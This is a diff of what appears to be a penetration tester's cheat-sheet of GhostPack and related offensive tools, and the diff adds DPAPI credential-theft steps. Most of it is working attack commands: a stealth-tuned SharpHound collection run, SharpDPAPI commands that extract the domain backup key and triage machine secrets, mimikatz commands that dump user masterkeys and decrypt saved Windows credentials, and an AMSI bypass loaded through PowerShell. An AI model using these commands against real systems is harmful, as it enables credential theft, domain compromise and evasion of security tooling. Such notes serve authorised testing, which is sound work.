@@ -9,9 +9,12 @@ GhostPack Tools
   SharpHound.exe execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpHound.exe -c All,GPOLocalGroup --windowsonly --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties  --throttle 120000 --jitter 7
   Rubeus.exe (Kerberose Tool)
   SharpDPAPI.exe
-    - SharpDPAPI backupkey /server:dc01.fqdn /file:keyname.pvk (file is optional; base64 without)
-    - SharpDPAPI traiage /pvk:key.pvk or /pvk:Base64
-    - SharpDPAPI machinetriage (must be system)
+    - DA: SharpDPAPI backupkey /server:dc01.fqdn /file:keyname.pvk (file is optional; base64 without)
+    - System: SharpDPAPI machinetriage
+    - User Get Key: mimikatz @dpapi::masterkey /in:”C:\Users\dfm.a\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1110\ca748af3-8b95-40ae-8134-cb9534762688″ /rpc
+    - User Decrypt Mimikatz: mimikazt @dpapi::cred /in:"C:\Users\s.bowers\AppData\Local\Microsoft\Credentials\5DD604C1E108746934B92E2A20318758" /masterkey:REDACTED
+    - User Decrypt Rubeus: SharpDPAPI traiage /pvk:key.pvk or /pvk:Base64
+    
   AMSIBypass - Rastamouse
     - [System.Reflection.Assembly]::LoadFile("D:\Tools\ASBBypass\ASBBypass\bin\Release\ASBBypass.dll")
     - [Amsi]::Bypass()
